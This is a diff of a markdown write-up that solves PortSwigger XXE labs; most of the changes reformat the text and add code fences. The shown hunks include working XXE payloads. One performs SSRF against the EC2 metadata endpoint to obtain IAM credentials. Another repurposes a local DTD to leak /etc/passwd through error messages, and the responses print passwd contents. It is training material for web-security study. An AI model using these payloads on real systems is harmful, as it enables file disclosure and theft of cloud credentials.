@@ -2,7 +2,7 @@
 XML external entity (XXE) injection - 4 Labs
 </span>
 
-# ***[XXE exlaintion:](https://portswigger.net/web-security/xxe)***
+# ***[XXE explained:](https://portswigger.net/web-security/xxe)***
 
 examples:
 ```xml
@@ -55,7 +55,6 @@ The lab server is running a (simulated) EC2 metadata endpoint at the default URL
 
 To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint. 
 
-
 **what we know:**
 EC2 metadata endpoint -  http://169.254.169.254/
 
@@ -71,20 +70,21 @@ POST /product/stock HTTP/1.1
 ```
 
 response:
-    HTTP/1.1 400 Bad Request
+```
+HTTP/1.1 400 Bad Request
 
-    "Invalid product ID: 
-    root:x:0:0:root:/root:/bin/bash
-    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin    ..
-    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-    peter:x:12001:12001::/home/peter:/bin/bash
-    carlos:x:12002:12002::/home/carlos:/bin/bash
-    user:x:12000:12000::/home/user:/bin/bash
-    elmer:x:12099:12099::/home/elmer:/bin/bash
-    academy:x:10000:10000::/academy:/bin/bash
-    ..
-    dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-
+"Invalid product ID: 
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin    ..
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+peter:x:12001:12001::/home/peter:/bin/bash
+carlos:x:12002:12002::/home/carlos:/bin/bash
+user:x:12000:12000::/home/user:/bin/bash
+elmer:x:12099:12099::/home/elmer:/bin/bash
+academy:x:10000:10000::/academy:/bin/bash
+..
+dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+```
 
 3. get data from another server:
 request for the files in the ip address:
@@ -119,8 +119,10 @@ request for "security-credentials" folder:
 ```xml
 <!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "http://169.254.169.254/latest/meta-data/security-credentials"> ]>
 ```
-response: 
+response:
+```
 "Invalid product ID: admin"
+```
 
 request for "admin" folder:
 ```xml
@@ -160,9 +162,8 @@ To solve the lab, inject an XInclude statement to retrieve the contents of the /
 </foo>
 ```
 
-
-
-<!-- examples: https://en.wikipedia.org/wiki/XInclude -->
+<!-- examples: https://en.wikipedia.org/wiki/XInclude 
+include exlanation: https://www.w3schools.com/xml/el_include.asp -->
 
 # Lab solved!
 
@@ -484,58 +485,64 @@ You'll need to reference an existing DTD file on the server and redefine an enti
 **Hint**: Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.
 
 1. check for existing DTD:
+```
     POST /product/stock HTTP/1.1
 
     <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">%local_dtd;]><stockCheck>
-
+```
 response:
+```
     HTTP/1.1 200 OK
 
-we know this dtd exist (if not present parser will return error: *"XML parser exited with error: java.io.FileNotFoundException: /usr/share/yelp/dtd/notreal.dtd (No such file or directory)"*)
+```
 
-2. check for dtd online: **https://github.com/GNOME/yelp/blob/master/data/dtd/docbookx.dtd**
+we know this dtd exist (if not present parser will return error: 
+>*"XML parser exited with error: java.io.FileNotFoundException: /usr/share/yelp/dtd/notreal.dtd (No such file or directory)"*)
 
-observe a list of potential enteties to repurpose:
-    %ISOamsa;
-    %ISOamsb;
-    %ISOamsc;
-    %ISOamsn;
-    %ISOamso;
-    %ISOamsr;
-    %ISObox;
-    %ISOcyr1;
-    %ISOcyr2;
-    %ISOdia;
-    %ISOgrk1;
-    %ISOgrk2;
-    %ISOgrk3;
-    %ISOgrk4;
-    %ISOlat1;
-    %ISOlat2;
-    %ISOnum;
-    %ISOpub;
-    %ISOtech;
-
-3. carft payload. replace **custom_entity** with above enteties namesL
-    <!DOCTYPE foo [
-    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
-    <!ENTITY % ISOtech '
-    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
-    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
-    &#x25;eval;
-    &#x25;error;
-    '>
-    %local_dtd;
-    ]>
-
+2. check for the dtd [online](https://github.com/GNOME/yelp/blob/master/data/dtd/docbookx.dtd)and observe a list of potential enteties to repurpose:
+```xml
+%ISOamsa;
+%ISOamsb;
+%ISOamsc;
+%ISOamsn;
+%ISOamso;
+%ISOamsr;
+%ISObox;
+%ISOcyr1;
+%ISOcyr2;
+%ISOdia;
+%ISOgrk1;
+%ISOgrk2;
+%ISOgrk3;
+%ISOgrk4;
+%ISOlat1;
+%ISOlat2;
+%ISOnum;
+%ISOpub;
+%ISOtech;
+```
+3. carft payload. replace **custom_entity** with above enteties names
+```xml
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOtech '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
 response:
-    HTTP/1.1 400 Bad Request
-    
-    "XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
-    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-    bin:x:2:2:bin:/bin:/usr/sbin/nologin
-    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+```
+HTTP/1.1 400 Bad Request
 
+"XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+```
 # Lab Solved!
 
 
@@ -545,16 +552,3 @@ response:
   ssrf explanation:https://portswigger.net/web-security/ssrf
   ec2 explanation: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
   IAM role explanation: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html -->
-
-
-
-
-
-
-<!-- Aparecium (Revealing Charm)
-Aparecium.jpg
-Type: Charm
-Pronunciation: AH-par-EE-see-um
-Description: Reveals secret messages written in invisible ink, or any other hidden markings. Also works against Concealing charms
-Seen/Mentioned: Used (to no avail) in 1993 by Hermione Granger to attempt to reveal any hidden writing in a diary.
-Etymology: Latin apparere, meaning "to appear"; -ium and -cium are common Latin noun endings.  -->
